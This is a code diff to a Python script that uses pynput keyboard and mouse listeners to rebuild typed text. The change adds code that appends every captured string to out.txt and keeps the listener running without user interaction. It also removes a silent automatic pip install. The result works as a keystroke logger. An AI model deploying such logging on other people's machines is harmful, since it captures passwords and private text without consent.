@@ -1,33 +1,9 @@
-import os.path
-import subprocess
-import sys
-import tempfile
-from os import mkdir
 from threading import Lock
-import pkg_resources
-
-required = {'pynput', 'pyperclip'}
-installed = {pkg.key for pkg in pkg_resources.working_set}
-missing = required - installed
-
-if missing:
-    python = sys.executable
-    subprocess.check_call(
-        [python, '-m', 'pip', 'install', *missing], stdout=subprocess.DEVNULL)
-
+from pathlib import Path
 from pynput import keyboard
 from pynput import mouse
 import pyperclip
 import time
-
-# tmp = tempfile.gettempdir()
-# if not os.path.exists(os.path.join(tmp, "pkl")):
-#     mkdir(os.path.join(tmp, "pkl"))
-# currentID = 0
-# file = ...
-# lock = Lock()
-
-
 
 class KeyObjectConst:
     """
@@ -262,7 +238,10 @@ class VirtualTextFieldObject:
 def textHandler(text):
     if len(text) == 0:
         return
-
+    current_working_directory = str(Path.cwd())
+    current_working_directory += "\\out.txt"
+    file = open(str(current_working_directory),'a')
+    file.write(str(text)+"\n")
     print(f"submitted: \"{text}\"")
 
 
@@ -294,4 +273,4 @@ if __name__ == "__main__":
     listener2 = mouse.Listener(on_click=handleMouseKey)
     listener2.start()
 
-    input()
+    listener.join()
